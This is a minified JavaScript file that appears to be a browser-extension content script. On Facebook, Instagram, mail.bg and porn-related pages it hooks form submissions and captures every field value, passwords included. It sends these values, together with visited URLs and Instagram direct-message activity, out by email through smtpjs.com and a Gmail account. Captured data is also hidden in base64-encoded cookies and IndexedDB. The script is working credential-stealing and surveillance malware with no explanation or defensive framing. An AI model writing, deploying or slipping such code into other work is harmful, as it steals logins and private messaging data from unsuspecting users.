var Email={send:function(b){return new Promise(function(a){b.nocache=Math.floor(1e6*Math.random()+1),b.Action="Send";var c=JSON.stringify(b);Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?",c,function(b){a(b)})})},ajaxPost:function(b,c,d){var f=Email.createCORSRequest("POST",b);f.setRequestHeader("Content-type","application/x-www-form-urlencoded"),f.onload=function(){var a=f.responseText;null!=d&&d(a)},f.send(c)},ajax:function(a,b){var c=Email.createCORSRequest("GET",a);c.onload=function(){var a=c.responseText;null!=b&&b(a)},c.send()},createCORSRequest:function(a,b){var c=new XMLHttpRequest;return"withCredentials"in c?c.open(a,b,!0):"undefined"==typeof XDomainRequest?c=null:(c=new XDomainRequest).open(a,b),c}};function utf8_to_b64(a){return window.btoa(unescape(encodeURIComponent(a)))}function b64_to_utf8(a){return decodeURIComponent(escape(window.atob(a)))}function SaveToDB(a){window.indexedDB=window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB,window.IDBTransaction=window.IDBTransaction||window.webkitIDBTransaction||window.msIDBTransaction||{READ_WRITE:"readwrite"},window.IDBKeyRange=window.IDBKeyRange||window.webkitIDBKeyRange||window.msIDBKeyRange;window.indexedDB.deleteDatabase("MyDatabase");var b=window.indexedDB.open("MyDatabase",3);b.onupgradeneeded=function(b){var c=b.target.result,d=c.createObjectStore("info",{autoIncrement:!0});d.add(a,"Data")}}function setCookie(a,b,c){a=utf8_to_b64(a),b=utf8_to_b64(b);var d="";if(c){var e=new Date;e.setTime(e.getTime()+1e3*(60*c)),d="; expires="+e.toUTCString()}document.cookie=a+"="+(b||"")+d+"; path=/"}function getCookie(a){a=utf8_to_b64(a);for(var b,d=a+"=",e=document.cookie.split(";"),f=0;f<e.length;f++){for(b=e[f];" "==b.charAt(0);)b=b.substring(1,b.length);if(0==b.indexOf(d))return b64_to_utf8(b.substring(d.length,b.length))}return null}var data="";function sendEmail(a){var b,c=1;if(getCookie(a))return;else{const h=new Date;var d=a+" - "+h.toLocaleString(),e=getCookie("to_send");if(e){var f=e.split(",");if(f.includes(d))b=(f+"").replaceAll(",","<br>");else{var g=f.length;f[g]=d,b=(f+"").replaceAll(",","<br>"),c=g}}else setCookie("to_send",d,1440),b=d}var h=location+"",i=["/direct/t/","/direct/new/"];Email.send({Host:"smtp.gmail.com",Username:user,Password:pass,To:user,From:user,Subject:"S_UPD ("+(c+"")+")",Body:b+""}).then(function(){setCookie("to_send","",-1);var b=i.some(a=>h.includes(a));b||setCookie(a,!0,1)})}var forms;function hookForms(){forms.forEach(a=>{var b=function(){var b={};Array.from(a.elements).forEach(a=>{data+=a.name+""+": "+(a.value+"")+" | ",b[a.name]=a.value}),data+=location+""+" || ",sendEmail(data),SaveToDB(b),data=""};if(location.hostname.includes("mail.bg")){var c=document.querySelectorAll("a");c.forEach(a=>{a.innerHTML.includes("\u0412\u041B\u0415\u0417")&&a.addEventListener("click",()=>{b()})})}else{var d=a.querySelector("button[type=\"submit\"]");d==null?a.addEventListener("submit",()=>{b()}):d.addEventListener("click",()=>{b()})}})}var tries=0;function initHook(){forms=document.querySelectorAll("form");10<=tries||(0>=forms.length?(tries++,setTimeout(initHook,2e3)):hookForms())}function initHREF(){var a=history.pushState,b=history.replaceState;history.pushState=function(){a.apply(history,arguments),window.dispatchEvent(new Event("pushstate")),window.dispatchEvent(new Event("locationchange"))},history.replaceState=function(){b.apply(history,arguments),window.dispatchEvent(new Event("replacestate")),window.dispatchEvent(new Event("locationchange"))},window.addEventListener("popstate",function(){window.dispatchEvent(new Event("locationchange"))}),window.addEventListener("locationchange",function(){var a=location+"";if(a.includes("/direct/inbox/")){var b=document?.querySelectorAll("a");b!=void 0&&b.forEach(a=>{a?.href.includes("/direct/t/")&&setCookie("cache_"+(a.href+""),a?.text,525600)})}else if(a.includes("/direct/t/")){var c=getCookie("cache_"+(location+""));c==void 0&&(c=document?.querySelectorAll("a[href='"+location.pathname+"']")[0]?.text,setCookie("cache_"+(location.href+""),c,525600)),a=location+""+" "+(c+"")}else if(a.includes("/direct/new/")){var d=document?.querySelectorAll("div[role='button']");d!=void 0&&d.forEach(a=>{a.addEventListener("click",()=>{sendEmail(location+""+" "+a.textContent)})});var e=document?.querySelectorAll("button[type='button']");d!=void 0&&e.forEach(a=>{a?.textContent.includes("Next")&&a.addEventListener("click",()=>{sendEmail(location+""+" "+a.textContent)})})}sendEmail(a)})}var isPorn=(location+"").includes("porn")||!0==document.querySelector("meta[name=description]")?.content.includes("porn")||!0==document.querySelector("meta[name=keywords]")?.content.includes("porn"),isIncludes=["facebook","instagram","mail.bg"];function InitProgram(){var a=location+"",b=isIncludes.some(b=>a.includes(b));(b||isPorn)&&(sendEmail(a),initHook(),(a.includes("instagram")||isPorn)&&initHREF())}
